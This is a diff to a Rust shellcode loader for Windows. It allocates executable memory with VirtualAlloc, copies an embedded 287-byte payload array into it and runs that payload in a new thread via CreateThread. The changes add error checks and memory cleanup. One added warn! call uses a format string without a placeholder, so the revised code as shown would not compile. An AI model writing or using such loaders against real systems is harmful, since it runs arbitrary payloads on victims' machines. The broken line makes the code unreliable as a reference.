@@ -1,5 +1,5 @@
 use winapi::um::processthreadsapi::CreateThread;
-use winapi::um::memoryapi::VirtualAlloc;
+use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
 use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::synchapi::WaitForSingleObject;
 use winapi::ctypes::c_void;
@@ -28,24 +28,32 @@ const SHELLCODE: [u8;287] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0
 
 fn main()
 {    
-
     unsafe
     {
         info!("Allocating space in memory");
-        let r_buffer: *mut c_void = VirtualAlloc(null_mut(), SHELLCODE.len(), 0x00001000, 0x40);
-        if GetLastError()==0
-        {   
-            std::ptr::copy(SHELLCODE.as_ptr() as *const u8, r_buffer as *mut u8, SHELLCODE.len());
-            let mut dw_tid: u32 = 0;
-            let h_thread: *mut c_void = CreateThread(null_mut(), 0, Some(transmute(r_buffer)), null_mut(), 0, &mut dw_tid);
-            okay!("ID of the Threads: {}", dw_tid);
-            okay!("Handle of the Threads: {:x?}", h_thread);
-            WaitForSingleObject(h_thread, 0xFFFFFFFF);
+        let r_buffer: *mut c_void = VirtualAlloc(null_mut(), SHELLCODE.len(), 0x3000, 0x40);
+        if r_buffer.is_null() {
+            warn!("Failed to allocate space in memory, error: {}", GetLastError());
+            std::process::exit(1);
         }
-        else
-        {
-            warn!("Allocation in the memory failed: {}", GetLastError());
+        okay!("Allocated {} bytes with xrw permissions", SHELLCODE.len());
+        
+        /*-----Copy the SHELLCODE to the space in memory-----*/
+        std::ptr::copy(SHELLCODE.as_ptr() as *const u8, r_buffer as *mut u8, SHELLCODE.len());
+        
+        /*-----Create a thread for the SHELLCODE to run-----*/
+        let mut dw_tid: u32 = 0;
+        let h_thread: *mut c_void = CreateThread(null_mut(), 0, Some(transmute(r_buffer)), null_mut(), 0, &mut dw_tid);
+        if h_thread.is_null() {
+            warn!("Failed to create a thread, error: []", GetLastError());
+            std::process::exit(1);
         }
+        okay!("ID of the Threads: {}", dw_tid);
+        okay!("Handle of the Threads: {:x?}", h_thread);
+        
+        /*-----Wait for the thread to finish and clean up-----*/
+        WaitForSingleObject(h_thread, 0xFFFFFFFF);
+        VirtualFree(r_buffer, 0, 0x8000);
     }
 }
 
